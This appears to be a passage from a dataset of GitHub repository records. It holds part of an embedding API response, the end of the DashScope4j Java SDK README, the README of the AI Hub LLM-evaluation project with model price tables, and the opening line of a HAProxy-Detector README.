.00665283203125,-0.008031845092773438,-0.014078140258789062,-0.011250078678131104,-0.013495206832885742,0.004352569580078125,-0.012280464172363281,-0.0186004638671875,0.012902259826660156,0.005423903465270996,-0.008781671524047852,-0.020849227905273438,-0.009944915771484375,0.0225677490234375,0.01090240478515625,0.014336436986923218,0.02898406982421875,0.024335384368896484,-0.043773651123046875,0.008069515228271484,-0.004877567291259766,0.008295059204101562,-0.015966415405273438,0.00356292724609375,-0.011985212564468384,-0.021459579467773438,0.007671356201171875,0.006745338439941406,-0.016894817352294922,-0.0011348724365234375,-0.00370025634765625,-0.012965202331542969,0.006458282470703125,0.0167083740234375,-0.00191497802734375,-0.004090487957000732,0.01709747314453125,0.004047870635986328,-0.0015459060668945312,-0.017927169799804688,-0.011654853820800781,0.020573139190673828,0.03529930114746094,0.013696670532226562,-0.005130290985107422,-0.004982471466064453,-0.013752460479736328,-0.023265838623046875,0.0045948028564453125,0.019138336181640625,0.008185625076293945,0.016518354415893555,0.023659706115722656,-0.0009086132049560547,-0.007733345031738281,-0.000621795654296875,0.001605987548828125,-0.010295867919921875,-0.010781288146972656,0.024916648864746094,0.0038330554962158203,-0.0011196136474609375,-0.0009768009185791016,-0.004784584045410156,-0.009212493896484375,-0.016958236694335938,0.027416229248046875,-0.01259756088256836,0.007937908172607422,0.008712291717529297,0.012671470642089844,0.005016326904296875,-0.0017042160034179688,-0.019853591918945312,-0.021303653717041016,0.00078582763671875,0.0345916748046875,0.005578517913818359,-0.01602959632873535,0.02281951904296875,0.008701801300048828,-0.0194549560546875,-0.018331527709960938,-0.00145721435546875,0.017847061157226562,-0.0016632080078125,0.0019140243530273438,-0.010118484497070312,-0.00003361701965332031,-0.019842326641082764,0.006102234125137329,-0.02023601531982422,-0.014788627624511719,0.01056051254272461,-0.0007123947143554688,-0.030268430709838867,-0.010068893432617188,0.01397716999053955,0.0090789794921875,-0.015488147735595703,-0.03184318542480469,0.000957489013671875,-0.016417503356933594,-0.0012082159519195557,0.031581878662109375,-0.003924369812011719,-0.03434181213378906,-0.00199127197265625,0.026735305786132812,0.010692596435546875,0.014389991760253906,0.024695873260498047,-0.010166168212890625,-0.025803565979003906,0.019855499267578125,0.007356166839599609,0.00200653076171875,0.004543304443359375,-0.02131366729736328,0.009784698486328125,-0.0007410049438476562,0.0015878677368164062,0.012359619140625,-0.009090423583984375,0.027805328369140625,-0.029253005981445312,-0.013429641723632812,-0.0191497802734375,0.0207366943359375,0.015712738037109375,0.01129770278930664,0.0070590972900390625,0.052001953125,0.018505096435546875,0.012189865112304688,-0.022455215454101562,-0.006117820739746094,0.00644683837890625,-0.010872960090637207,0.024570465087890625,-0.044330596923828125,-0.024204254150390625,-0.0200042724609375,-0.014544963836669922,0.02239990234375,-0.023189544677734375,-0.008693695068359375,-0.004992961883544922,0.010601043701171875,0.01981377601623535,0.011806964874267578,-0.01589524745941162,0.010772466659545898,0.026300430297851562,0.006534576416015625,-0.019054412841796875,-0.043548583984375,0.015831947326660156,0.00054931640625,0.006204128265380859,-0.0093536376953125,-0.016933441162109375,0.0055446624755859375,-0.017252445220947266,0.0005619525909423828,-0.002444028854370117,-0.01882171630859375,-0.025396347045898438,0.0092010498046875,-0.04595184326171875,0.01120138168334961,-0.0021228790283203125,-0.017965316772460938,-0.009843826293945312,-0.03500652313232422,0.01142120361328125,-0.012362480163574219,-0.010705947875976562,-0.010977983474731445,0.01877307891845703,-0.013124465942382812,0.0017638206481933594,-0.011728405952453613,-0.00019741058349609375,0.013208389282226562,-0.01964569091796875,0.047976016998291016,-0.0044078826904296875,0.00855875015258789,0.009824752807617188,0.0009918212890625,0.011437416076660156,0.013042449951171875,0.0078029632568359375,-0.02964019775390625,-0.010420262813568115,0.0032444000244140625,0.027982711791992188,-0.006988584995269775,0.01195991039276123,-0.03798389434814453,0.022722244262695312,0.0058612823486328125,0.014232635498046875,0.012263298034667969,-0.02658843994140625,0.0013155937194824219,0.0056247711181640625,-0.0434722900390625,0.017958879470825195,0.020740270614624023,-0.022977828979492188,0.021724700927734375,-0.024759292602539062,0.025125503540039062,0.009482383728027344,-0.010997772216796875,0.022123336791992188,0.0013804435729980469,0.0036077499389648438,-0.00286102294921875,-0.0255889892578125,-0.008465290069580078,-0.001964569091796875,0.015351295471191406,0.004029273986816406,-0.002907097339630127,0.012477397918701172,0.014642715454101562,-0.013310432434082031,-0.0283050537109375,0.0030984878540039062,0.007604122161865234,-0.02023792266845703,-0.0023005008697509766,-0.02260589599609375,-0.012882232666015625,-0.020160675048828125,0.024152755737304688,0.024440765380859375,-0.017038345336914062,-0.00025272369384765625,0.03184032440185547,0.012683868408203125,-0.0032466650009155273,-0.015590667724609375,0.007255434989929199,-0.022096633911132812,-0.043609619140625,0.004124164581298828,-0.015163064002990723,0.019342899322509766,0.032405853271484375,0.002512693405151367,0.012612342834472656,0.008920669555664062,-0.011710166931152344,0.004619479179382324,0.00339508056640625,-0.013296842575073242,0.01153564453125,-0.004476815462112427,0.007638275623321533,0.028653621673583984,0.0026903152465820312,0.02442169189453125,0.0036079883575439453,-0.004741668701171875,0.0007185935974121094,-0.02651071548461914,-0.023145675659179688,0.0074405670166015625,-0.010251998901367188,-0.00798797607421875,-0.007457733154296875,0.0030107498168945312,-0.00382232666015625,-0.011152267456054688,-0.0142059326171875,-0.005826473236083984,0.026821136474609375,-0.030930519104003906,-0.01899433135986328,-0.02466869354248047,-0.01697540283203125,-0.0020122528076171875,0.016819000244140625,-0.012147784233093262,-0.00452423095703125,-0.013282418251037598,0.011698484420776367,-0.011749267578125,0.005962371826171875,0.020397186279296875,0.0018553733825683594,0.026247024536132812,-0.021659374237060547,-0.0043926239013671875,-0.022314071655273438,0.0032558441162109375,-0.01929950714111328,0.0070819854736328125,-0.031322479248046875,-0.0072460174560546875,0.02514171600341797,0.023197293281555176,0.017496347427368164,0.016412734985351562,0.015550613403320312,0.029481887817382812,0.0024938583374023438,-0.03358268737792969,0.009153604507446289,-0.0059206485748291016,-0.018990516662597656,-0.011719703674316406,0.02089691162109375,-0.02517986297607422,-0.03409004211425781,0.007758140563964844,-0.019727468490600586,0.0066165924072265625,0.024572372436523438,-0.015870749950408936,0.020519495010375977,0.008495330810546875,-0.01471710205078125,-0.004069328308105469,-0.012205123901367188,-0.01880168914794922,0.0022734403610229492,-0.009032249450683594,-0.01767730712890625,-0.011598587036132812,0.015825271606445312,0.009517669677734375,-0.0142059326171875,0.0017118453979492188,-0.012073516845703125,0.017994403839111328,0.014819145202636719,0.017164230346679688,-0.01837635040283203,-0.021579742431640625,-0.004968404769897461,0.013225555419921875,-0.02767181396484375,0.0015041828155517578,0.0200347900390625,-0.014980196952819824,-0.007397174835205078,0.009478569030761719,0.008846282958984375,-0.0443115234375,-0.021879196166992188,-0.006868839263916016,0.01274871826171875,-0.011800765991210938,-0.021856307983398438,0.001911163330078125,0.01044464111328125,-0.0046634674072265625,-0.002880096435546875,0.006512641906738281,-0.011351346969604492,-0.01728057861328125,-0.014253616333007812,-0.013347625732421875,-0.002254486083984375,0.02197885513305664,-0.03180694580078125,0.01308584213256836,-0.0286712646484375,0.014621734619140625,0.004803180694580078,-0.0016193389892578125,-0.030719757080078125,-0.0024809837341308594,0.01842975616455078,0.003505706787109375,0.008195877075195312,-0.0056934356689453125,-0.01154327392578125,0.017331600189208984,-0.009812355041503906,-0.008294105529785156,0.002582550048828125,0.041065216064453125,0.02294921875,0.011183738708496094,-0.01893782615661621,0.010000228881835938,0.006923675537109375,-0.02275848388671875,-0.009257316589355469,0.029851913452148438,-0.00969696044921875,-0.025770187377929688,0.0031042098999023438,0.013427734375,0.005124151706695557,0.00091552734375,-0.008762836456298828,-0.0047969818115234375,-0.01312565803527832,0.0071773529052734375,-0.007502555847167969,0.0018901824951171875,0.0009469985961914062,-0.009815216064453125,-0.01870870590209961,0.02675914764404297,0.01828479766845703,-0.0006215572357177734,-0.025432586669921875,-0.00489044189453125,0.013131141662597656,0.00298309326171875,-0.004065036773681641,0.018266499042510986,-0.02120208740234375,-0.007919788360595703,0.0031414031982421875,-0.028224945068359375,0.016166329383850098,0.03076648712158203,-0.0521693229675293,0.012002825736999512,0.0062749385833740234,-0.022798538208007812,-0.00193023681640625,0.026035308837890625,-0.016458511352539062,0.030635356903076172,0.009813308715820312,0.012674808502197266,-0.01869058609008789,-0.018732547760009766,-0.019260406494140625,-0.021635055541992188,-0.01958942413330078,0.005859375,-0.01403498649597168,-0.010931015014648438,0.005549430847167969,-0.004682660102844238,-0.01435995101928711,0.018383026123046875,-0.019127845764160156,0.03119659423828125,-0.004809856414794922,0.008137226104736328,0.023308873176574707,0.030050992965698242,-0.01059722900390625,0.0044727325439453125,-0.0158233642578125,-0.007042407989501953,-0.00787973403930664,0.001673579216003418,-0.015542984008789062,0.013258934020996094,0.00954437255859375,0.0653533935546875,0.010868072509765625,0.02274608612060547,0.015302658081054688,-0.01785755157470703,-0.008780479431152344,-0.0075531005859375,-0.014470100402832031,0.003185272216796875,0.014212608337402344,-0.01470184326171875,0.007844924926757812,0.0058155059814453125,-0.019008636474609375,-0.007155418395996094,0.011980444192886353,0.03687477111816406,0.00979304313659668,-0.0086517333984375,0.01589369773864746,-0.02635955810546875,0.01401519775390625,0.004192352294921875,0.031229019165039062,0.034450531005859375,-0.03583335876464844,-0.014777660369873047,-0.0046224892139434814,-0.01515960693359375,-0.0070400238037109375,0.042140960693359375,-0.014858245849609375,0.0026659369468688965,0.017610549926757812,-0.02205657958984375,-0.02759552001953125,-0.03662109375,-0.017461776733398438,-0.039302825927734375,-0.00030803680419921875,-0.002872288227081299,0.001255035400390625,0.023782730102539062,0.01866912841796875,0.00894927978515625,-0.02667236328125,0.0055694580078125,0.00995635986328125,-0.002247333526611328,0.003208160400390625,-0.031032562255859375,0.00023794174194335938,0.021986931562423706,-0.0189666748046875,0.010197639465332031,0.0068035125732421875,-0.007573127746582031,-0.013179779052734375,0.0068416595458984375,-0.007094383239746094,-0.007396697998046875,0.02311992645263672,-0.023059844970703125,0.03047943115234375,0.0030231475830078125,0.0030231475830078125,-0.000011444091796875,-0.024669647216796875,-0.00347137451171875,-0.012431144714355469,0.037899017333984375,0.006854057312011719,0.04059600830078125,-0.01750946044921875,-0.020485877990722656,0.007534027099609375,-0.0014934539794921875,-0.017330169677734375,0.010784149169921875,0.0046863555908203125,-0.00042057037353515625,0.012380599975585938,-0.013477325439453125,0.012972831726074219,-0.005650520324707031,0.006976127624511719,0.008848190307617188,-0.03168678283691406,0.0060863494873046875,-0.012675106525421143,-0.00452423095703125,0.010771751403808594,0.019414424896240234,0.00414276123046875,-0.024505615234375,-0.02331829071044922,-0.006413936614990234,-0.02246570587158203,-0.011936187744140625,-0.008569717407226562,-0.04334449768066406,-0.003168821334838867,-0.05678820610046387,-0.02024078369140625,-0.017319202423095703,0.031622886657714844,-0.0551910400390625,-0.0064067840576171875,-0.008914470672607422,0.013456344604492188,0.028057098388671875,-0.002521514892578125,0.021375656127929688,0.0002593994140625,-0.011912822723388672,0.018951416015625,-0.015659332275390625,-0.005734443664550781,-0.01125335693359375,-0.0048770904541015625,0.00754779577255249,-0.010206222534179688,-0.0027179718017578125,-0.0022835731506347656,0.0066280364990234375,0.0049991607666015625,0.0073337554931640625,-0.0026023387908935547,0.0042896270751953125,-0.008472442626953125,-0.006000518798828125,0.005978986620903015,0.04144096374511719,0.025770187377929688,-0.017887115478515625,-0.019112110137939453,-0.01268148422241211,0.005904197692871094,-0.014520764350891113,0.0240478515625,0.0022497177124023438,0.002758026123046875,-0.0002384185791015625,-0.01725947856903076,-0.0068149566650390625,0.00356292724609375,0.01715397834777832,-0.0022983551025390625,0.024110794067382812,0.0071059465408325195,-0.007490992546081543,0.0064487457275390625,-0.026391029357910156,-0.008091926574707031,0.0054264068603515625,0.008389472961425781,-0.002796173095703125,-0.011179924011230469,-0.0301666259765625,0.01064610481262207,0.022630691528320312,0.002849578857421875,-0.017267227172851562,0.0022830963134765625,-0.016002655029296875,0.009270191192626953,-0.0023946762084960938,-0.016635894775390625,0.014682769775390625,0.030345916748046875,0.025140762329101562,-0.013407230377197266,0.016996145248413086,0.0059642791748046875,0.006434917449951172,0.01766347885131836,-0.03404998779296875,0.013857841491699219,-0.007364749908447266,0.027521371841430664,0.0185086727142334,0.009374618530273438,0.0041637420654296875,-0.001495361328125,0.032068848609924316,0.012919425964355469,-0.0156632661819458,0.0047855377197265625,-0.007779598236083984,0.04093170166015625,-0.02104663848876953,-0.024135589599609375,-0.0039272308349609375,-0.0031518936157226562,-0.028255462646484375,-0.020275592803955078,0.013723134994506836,0.0000514984130859375,0.011342048645019531,-0.009977340698242188,-0.006821915507316589,-0.0029325485229492188,0.025970458984375,0.018266677856445312,0.007988929748535156,0.0057525634765625,0.024163246154785156,0.003002166748046875,-0.03264617919921875,0.008662700653076172,-0.00856637954711914,-0.00021696090698242188,0.009143829345703125,-0.013262271881103516,0.03429412841796875,0.012668609619140625,-0.021894454956054688,0.00560152530670166,-0.02027130126953125,-0.011510848999023438,-0.006572723388671875,-0.003208160400390625,0.0321803092956543,0.0069119930267333984,0.028016090393066406,-0.021007537841796875,0.013442039489746094,0.0347137451171875,0.009145975112915039,0.013235092163085938,-0.0004239082336425781,0.019448280334472656,-0.005435943603515625,-0.013116836547851562,-0.002476811408996582,0.009334564208984375,0.005548834800720215,-0.03663831949234009,0.005269050598144531,-0.017805099487304688,0.0062427520751953125,-0.020352840423583984,0.01363372802734375,0.012795448303222656,-0.01770305633544922,0.010586202144622803,-0.004390239715576172,0.006525993347167969,0.008387565612792969,0.013690412044525146,0.015453338623046875,0.016832351684570312,0.0016205310821533203,-0.008472442626953125,-0.013593673706054688,-0.0007975101470947266,0.00005844235420227051,-0.01666402816772461,0.032901763916015625,-0.001873016357421875,0.01458740234375,-0.013909339904785156,-0.0012216567993164062,0.006198406219482422,-0.011687278747558594,0.008055806159973145,-0.004341334104537964,-0.01659393310546875,0.0040130615234375,0.011870980262756348,0.015612363815307617,-0.004800811409950256,0.01993560791015625,0.0026276111602783203,-0.03765273094177246,-0.014386177062988281,0.005565643310546875,0.01947641372680664,0.027099609375,-0.008671998977661133,-0.0063707828521728516,0.017267227172851562,0.0048940181732177734,0.006175994873046875,-0.019133567810058594,-0.01977825164794922,-0.01381683349609375,-0.01605987548828125,-0.024147987365722656,0.010377883911132812,-0.0238189697265625,-0.0001201629638671875,-0.00151824951171875,-0.035950422286987305,0.0316925048828125,-0.002849578857421875,-0.0216064453125,0.020771026611328125,-0.04282665252685547,-0.0012485980987548828,-0.004303932189941406,-0.0009965896606445312,0.03778266906738281,0.009292125701904297,0.012995719909667969,-0.019092559814453125,-0.0056781768798828125,-0.014499664306640625,0.024135589599609375,0.010506153106689453,-0.018766403198242188,0.0014905929565429688,-0.0062427520751953125,-0.011827349662780762,0.010950088500976562,0.010059237480163574,0.0020339488983154297,0.03912353515625,0.009624004364013672,-0.017357468605041504,-0.002869844436645508,0.01861572265625,-0.02283334732055664,0.008321762084960938,-0.0009095668792724609,-0.0020166486501693726,0.009437084197998047,0.024478912353515625,0.0069217681884765625,0.026760101318359375,-0.019593238830566406,-0.042789459228515625,0.04044198989868164,0.014730453491210938,-0.025165557861328125,-0.006939888000488281,-0.01203155517578125,0.0034481287002563477,-0.015842437744140625,-0.025133132934570312,-0.020143508911132812,0.0173797607421875,-0.00859832763671875,0.01553964614868164,-0.017887115478515625,-0.024831771850585938,0.010150909423828125,-0.021881103515625,-0.0167999267578125,0.011527061462402344,-0.0034637451171875,-0.008426189422607422,-0.024639129638671875,-0.029087066650390625,-0.012368202209472656,0.01458740234375,-0.0134429931640625,-0.024379730224609375,-0.02133941650390625,-0.008868217468261719,0.011730670928955078,0.002190113067626953,-0.003635406494140625,-0.000522613525390625,0.0004253387451171875,-0.02270030975341797,-0.010772228240966797,-0.017958641052246094,0.017289161682128906,0.006549239158630371,-0.017750918865203857,0.008399009704589844,0.0003490447998046875,0.0046291351318359375,-0.015466690063476562,-0.00736236572265625,0.01204681396484375,0.017610549926757812,0.013065338134765625,0.01569366455078125,0.0016980171203613281,0.025362133979797363,0.01245570182800293,0.02231121063232422,-0.016411781311035156,0.009354591369628906,0.0007534027099609375,-0.0071258544921875,-0.033690452575683594,-0.018520355224609375,0.018801212310791016,-0.012007713317871094,-0.030857086181640625,-0.005173683166503906,0.013844490051269531,0.003353297710418701,-0.019059181213378906,-0.016803741455078125,-0.002732515335083008,0.016240954399108887,0.0010290145874023438,0.026058197021484375,-0.0008764266967773438,0.004401206970214844,-0.00554656982421875,-0.011745452880859375,-0.0011081695556640625,0.0005931854248046875,-0.00217437744140625,0.010144233703613281,-0.02487945556640625,-0.012645721435546875,0.009256482124328613,-0.004539966583251953,-0.01030731201171875,0.017576277256011963,0.02353668212890625,0.006230354309082031,0.006053924560546875,0.011409759521484375,-0.011490345001220703,-0.01616954803466797,0.009822845458984375,-0.012165069580078125]},""usage"":{""image"":{""measure"":1,""weight"":1},""total_usage"":5,""audio"":{""measure"":1,""weight"":2},""text"":{""measure"":2,""weight"":1}},""request_id"":""2eeb465c-9081-9cd6-a650-74fbd54ebe89""}
```

### 支持拦截API调用

通过`DashScopeClient.Builder`设置，可实现AOP的功能，限流控制、失败重试等功能均基于此实现。

示例代码

```java
DashScopeClient client = DashScopeClient.newBuilder()
    .ak(AK)
    .executor(executor)
    .appendInterceptors(List.of(
        new Interceptor() {

            @Override
            public CompletableFuture<?> handle(InvocationContext context, ApiRequest<?> request, OpHandler opHandler) {
                return opHandler.handle(request);
            }

        }
    ))
    .build();
```

### 支持无感使用临时空间

在`对话`、`多模态向量计算`和`文档分析插件`等请求中如果需要解析图片、音频、文档等内容，不再需要提前上传到OSS转换为外网可访问的URL连接。这样极不方便也不安全。

通过灵积平台提供的[临时空间](https://help.aliyun.com/zh/dashscope/developer-reference/guidance-of-temporary-storage-space)
可以很好解决这个问题，但操作起来需要调用额外的api且需要对url进行拼接和替换，略为繁琐。

dashscope4j帮你封装了这个繁琐的操作，你只需要设置内容的时候将本地文件直接传入Content，框架会自动识别并帮你完成临时空间上传和转换连接操作。并自带一个缓存避免重复上传。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .option(ChatOptions.ENABLE_INCREMENTAL_OUTPUT, true)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""图片中一共多少辆自行车?"")
        ))
    ))
    .build();
```

## 五、参与贡献

如果你对`DashScope4j`感兴趣并希望为其做出贡献，请遵循以下步骤：

1. Fork本项目到你的GitHub账户。
2. 克隆项目到你的本地环境。
3. 创建一个新的分支用于你的修改。
4. 提交你的更改并通过`Pull Request`请求合并到主分支。

在提交Pull Request之前，请确保你的代码符合项目的编码规范和最佳实践，并且已经通过了相关的测试。

## 六、关于软件

### 版本号声明

软件版本号采用：`大版本`.`小版本`.`漏洞修复`的格式

- **大版本：** 程序的架构设计进行重大升级或重大改造

- **小版本：**
    1. 增加新的API功能
    2. 在现有架构下完成局部架构的微调

- **漏洞修复：** 在不改变现有架构和API情况下，对漏洞修复和增强

### 写在最后

灵积是有官方的Java客户端的，我之所以还需要开发这个`DashScope4j`主要是基于以下几点考虑

1. 官方的SDK并不开源，你无法查看其源码，也无法自行修改和定制
2. 个人练手习惯，反正也不花我多少时间，嗯嗯

## 七、相关链接

- [模型服务-灵积](https://dashscope.aliyun.com)
- [帮助文档-灵积](https://help.aliyun.com/zh/dashscope/)
",7,2,2,apache-2.0,8.0,"['java', 'sdk', 'java', 'tokenizer']","['java', 'sdk', 'tokenizer']",1,0,0,"['java', 'sdk', 'tokenizer']",33,"['java', 'sdk', 'tokenizer']",32,45.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,131676,321.9756097560976,8.298234982198318,"['License -> https://img.shields.io/badge/License-Apache_2.0-green.svg', 'JDK17+ -> https://img.shields.io/badge/JDK-17+-blue.svg', 'LLM-通义千问 -> https://img.shields.io/badge/LLM-%E9%80%9A%E4%B9%89%E5%8D%83%E9%97%AE-blue.svg', '例子：如何用通义千问做一个同声传译 -> https://github.com/oldmanpushcart/dashscope4j/wiki/Example-SimulaTrans', '模型服务-灵积 -> https://dashscope.console.aliyun.com/', 'query_score -> https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/QueryScoreFunction.java', 'compute_avg_score -> https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/ComputeAvgScoreFunction.java', '文生图-美女 -> https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-003.png', '《第十四个五年规划》 -> https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf', '临时空间 -> https://help.aliyun.com/zh/dashscope/developer-reference/guidance-of-temporary-storage-space', '模型服务-灵积 -> https://dashscope.aliyun.com', '帮助文档-灵积 -> https://help.aliyun.com/zh/dashscope/']",12
xielong/ai-hub,main,"# AI Hub Project

## 简介

AI Hub旨在持续测试和评估主流大型语言模型，同时积累和管理各种有效的模型调用提示（prompt）。目前，AI Hub已接入国内所有主流的大型语言模型，包括文心一言、腾讯混元、智谱AI、MiniMax、百川智能等，并计划持续追踪、接入和评估新模型。

已支持模型列表：
1. OpenAI / gpt-4-turbo
2. OpenAI / gpt-3.5-turbo
3. Baidu / ERNIE-Bot-4（文心一言4）
4. Baidu / ERNIE-Bot-turbo（文心一言）
5. Zhipu / glm-4（智谱GLM-4）
6. Zhipu / chatGLM_turbo（智谱chatGLM）
7. Ali / qwen-plus（通义千问plus）
8. Ali / qwen-turbo（通义千问）
9. Tencent / ChatPro（腾讯混元）
10. Tencent / ChatStd（腾讯混元）
11. Tencent / hunyuan-lite（腾讯混元)
12. Baichuan / Baichuan2-Turbo（百川）
13. Minimax / abab5.5-chat（MiniMax）
14. Minimax / abab6-chat（MiniMax）
15. Xunfei / Spark3.1（讯飞星火）
16. Moonshot / moonshot-v1-8k (月之暗面)
17. Xunfei / Spark3.5 (讯飞星火3.5)
18. ByteDance / Skylark-chat (字节豆包)
19. Lingyi / yi-34b-chat-0205 (零一万物)
20. Lingyi / yi-34b-chat-200k (零一万物)
21. Lingyi / yi-vl-plus (零一万物)
22. Deepseek / DeepSeek-V2 (Deepseek)
23. Baidu / ERNIE-Lite-8K（文心一言）
24. Baidu / ERNIE-Speed-8K（文心一言）
25. Xunfei / Spark-Lite（讯飞星火）

在 [大模型列表](#大模型列表) 部分，有更完整的大语言模型列表。请注意，其中的一些大语言模型尚未经过评估，我将陆续对这些模型进行评估。


![chat-demo](assets/chat-demo.png)

使用前请在 Settings 页面设置模型的 credentials：
![settings](assets/settings.png)

## 评估结果
### 英文翻译
[测试用例看这里](docs/use_cases/translation/)
![英文翻译](assets/assess_translation.png)

### 编程
[测试用例看这里](docs/use_cases/coding/)
![英文翻译](assets/assess_coding.png)

### 指令输出
[测试用例看这里](docs/use_cases/instruction/)
![英文翻译](assets/assess_instruction.png)


## 大模型接入
如果你想自己接入列表中的大模型，可以通过以下方式。
### Rest 服务
启动 ai-hub-server，访问
```http
http://127.0.0.1:3000/api/v1/models/${provider}/${model}:chat
```
Post:
```json
{
    ""input"": ""${input}""
}
```
### Java 代码接入
可以参考[这里](ai-hub-server/src/main/java/com/github/xielong/aihub/adapter)
```java
@Service
public class AIModelInvokerFactory {

    private final ApplicationContext context;

    @Autowired
    public AIModelInvokerFactory(ApplicationContext context) {
        this.context = context;
    }

    public AIModelInvoker getProviderAdapter(String providerName) {
        AIProvider provider = AIProvider.fromName(providerName);

        switch (provider) {
            case OPENAI:
                return context.getBean(OpenAIInvoker.class);
            case BAICHUAN:
                return context.getBean(BaichuanInvoker.class);
            case ALI:
                return context.getBean(AliInvoker.class);
            case BAIDU:
                return context.getBean(BaiduInvoker.class);
            case ZHIPU:
                return context.getBean(ZhipuInvoker.class);
            case TENCENT:
                return context.getBean(TencentInvoker.class);
            case XUNFEI:
                return context.getBean(XunfeiInvoker.class);
            case MINIMAX:
                return context.getBean(MiniMaxInvoker.class);
            default:
                throw new IllegalArgumentException(""Unknown provider: "" + provider);
        }
    }

}

```

## 运行

### Docker
推荐使用 docker-compose 启动服务
```shell
cd docker
docker-compose up -d
```

### 数据库
参考[脚本](docker/init-db/init.sql)

### 前端
```shell
cd ai-hub-fe
npm run start
```

### 服务端
需要 JDK 11 以上版本
```shell
cd ai-hub-server
mvn clean package
java -jar ai-hub-server-1.0.0-SNAPSHOT-exec.jar
```

## 测试集

### [翻译](docs/use_cases/translation/)
### [编程](docs/use_cases/coding/)
### z-bench 测试集

## 大模型列表

### 低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Baidu     | ERNIE Speed    | 免费                | 8k             |
| Baidu     | ERNIE Lite     | 免费                | 8k             |
| Tencent   | hunyuan-lite   | 免费                | 256k           |
| ByteDance | Doubao-lite    | Input: 0.3 \| Output: 0.6 | 32k     |
| Zhipu     | GLM-3-Turbo    | 1                   | 128k           |
| Lingyi    | yi-spark       | 1                   | 16k            |
| Ali       | qwen-long      | Input: 0.5 \| Output: 2 | 10m      |
| ByteDance | Doubao-pro     | Input: 0.8 \| Output: 2 | 32k     |
| DeepSeek  | deepseek-chat  | Input: 1 \| Output: 2  | 32k     |
| Lingyi    | yi-medium      | 2.5                 | 16k            |

### 中低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Ali       | qwen-turbo     | Input: 2 \| Output: 6  | 8k          |
| Tencent   | hunyuan-standard | Input: 4.5 \| Output: 5 | 32k    |
| MiniMax   | abab5.5s       | 5                   | 8k             |
| OpenAI    | GPT-3.5 Turbo  | Input: $0.50 \| Output: $1.50 | 16k |
| ByteDance | Doubao-pro-128k | Input: 5 \| Output: 9 | 128k   |
| Baichuan  | Baichuan2-Turbo | 8                  | 32k            |
| MiniMax   | abab6.5s       | 10                  | 245k           |
| Ali       | qwen-plus      | Input: 4 \| Output: 12 | 32k     |
| Baidu     | ERNIE 3.0      | 12                  | 8k             |
| Baichuan  | Baichuan3-Turbo | 12                 | 32k            |
| Lingyi    | yi-large-turbo | 12                  | 16k            |
| Lingyi    | yi-medium-200k | 12                  | 200k           |
| Moonshot  | moonshot-v1-8k | 12                  | 8k             |

### 中高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| Moonshot  | moonshot-v1-32k    | 24                  | 32k            |
| Baichuan  | Baichuan3-Turbo-128k | 24                | 128k           |
| MiniMax   | abab6.5            | 30                  | 8k             |
| Tencent   | hunyuan-standard-256k | Input: 15 \| Output: 60 | 256k |
| Moonshot  | moonshot-v1-128k   | 60                  | 128k           |

### 高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| OpenAI    | GPT-4o             | Input: $5 \| Output: $15 | 128k     |
| Baidu     | ERNIE-3.5-128k     | Input: 48 \| Output: 96 | 128k     |
| Tencent   | hunyuan-pro        | Input: 30 \| Output: 100 | 32k     |
| Ali       | qwen-max           | Input: 40 \| Output: 120 | 8k      |
| Zhipu     | GLM-4              | 100                 | 128k           |
| Baichuan  | Baichuan4          | 100                 | 32k            |
| Baidu     | ERNIE 4.0          | 120                 | 8k             |",0,1,1,apache-2.0,0.0,"['ai', 'hub', 'project', 'ai', 'openai', 'openai', 'baidu', 'baidu', 'zhipu', 'zhipu', 'ali', 'ali', 'tencent', 'tencent', 'tencent', 'baichuan', 'minimax', 'minimax', 'xunfei', 'moonshot', 'xunfei', 'bytedance', 'lingyi', 'lingyi', 'lingyi', 'deepseek', 'deepseek', 'baidu', 'baidu', 'xunfei', 'setting', 'rest', 'post', 'java', 'docker', 'jdk', 'company', 'model', 'price', 'token', 'context', 'length', 'baidu', 'ernie', 'speed', 'baidu', 'ernie', 'lite', 'tencent', 'bytedance', 'input', 'output', 'zhipu', 'lingyi', 'ali', 'input', 'output', 'bytedance', 'input', 'output', 'deepseek', 'input', 'output', 'lingyi', 'company', 'model', 'price', 'token', 'context', 'length', 'ali', 'input', 'output', 'tencent', 'input', 'output', 'minimax', 'openai', 'turbo', 'input', 'output', 'bytedance', 'input', 'output', 'baichuan', 'minimax', 'ali', 'input', 'output', 'baidu', 'ernie', 'baichuan', 'lingyi', 'lingyi', 'moonshot', 'company', 'model', 'price', 'token', 'context', 'length', 'moonshot', 'baichuan', 'minimax', 'tencent', 'input', 'output', 'moonshot', 'company', 'model', 'price', 'token', 'context', 'length', 'openai', 'input', 'output', 'baidu', 'input', 'output', 'tencent', 'input', 'output', 'ali', 'input', 'output', 'zhipu', 'baichuan', 'baidu', 'ernie']","['input', 'output', 'baidu', 'tencent', 'lingyi']",0,0,0,"['ai', 'hub', 'project', 'rest', 'java', 'docker']",23,"['ai', 'hub', 'project', 'rest', 'java']",6,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,6352,21.83870967741936,4.833087149187592,[],0
HaHaWTH/HAProxy-Detector,master,"# HAProxyDetector-Fork

